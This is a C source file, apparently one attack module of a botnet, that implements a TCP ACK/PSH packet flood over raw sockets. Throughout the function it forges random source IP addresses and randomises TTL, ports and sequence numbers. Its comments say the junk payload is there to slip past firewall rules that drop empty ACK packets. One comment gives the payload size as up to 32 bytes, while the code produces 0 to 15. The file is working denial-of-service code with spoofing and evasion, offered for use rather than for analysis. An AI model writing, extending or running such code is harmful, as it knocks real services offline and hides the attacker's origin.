#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>

#include "attack.h"

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// Advanced ACK Flood
// - High PPS
// - Mimics Established Connection Data Push (PSH + ACK)
// - Random Payload to bypass "Empty ACK" strict firewall rules
void attack_tcp_ack(uint32_t ip, uint16_t port, uint32_t duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = ip;

    char packet[4096];
    struct ip *iph = (struct ip *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct ip));
    struct pseudo_header psh;

    time_t end_time = time(NULL) + duration;
    
    // Randomize payload size slightly (0 to 32 bytes)
    // Helps bypass empty packet filters
    int payload_len = 0; 

    while (time(NULL) < end_time) {
        payload_len = fast_rand() % 16; // 0-15 bytes junk

        iph->ip_hl = 5;
        iph->ip_v = 4;
        iph->ip_tos = 0;
        iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + payload_len;
        iph->ip_id = htonl(fast_rand() & 0xFFFF);
        iph->ip_off = 0;
        iph->ip_ttl = 64 + (fast_rand() % 64); // Random TTL 64-128
        iph->ip_p = IPPROTO_TCP;
        iph->ip_src.s_addr = fast_rand();
        iph->ip_dst.s_addr = ip;
        iph->ip_sum = 0;
        iph->ip_sum = csum((unsigned short *)packet, sizeof(struct ip)); // Just header sum

        tcph->th_sport = htons(fast_rand() & 0xFFFF);
        tcph->th_dport = htons(port);
        tcph->th_seq = fast_rand();
        tcph->th_ack = fast_rand(); // Crucial for ACK flood
        tcph->th_off = 5; 
        tcph->th_flags = TH_ACK | TH_PUSH; // PSH+ACK mimics data
        tcph->th_win = htons(64240);
        tcph->th_sum = 0;
        tcph->th_urp = 0;

        // Fill payload
        if (payload_len > 0) {
            char *data = (char *)(packet + sizeof(struct ip) + sizeof(struct tcphdr));
            // Just junk
            *(uint32_t*)data = fast_rand();
        }

        psh.source_address = iph->ip_src.s_addr;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + payload_len);

        char pseudogram[512];
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + payload_len);
        
        tcph->th_sum = csum((unsigned short*)pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_len);

        sendto(sock, packet, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    close(sock);
}
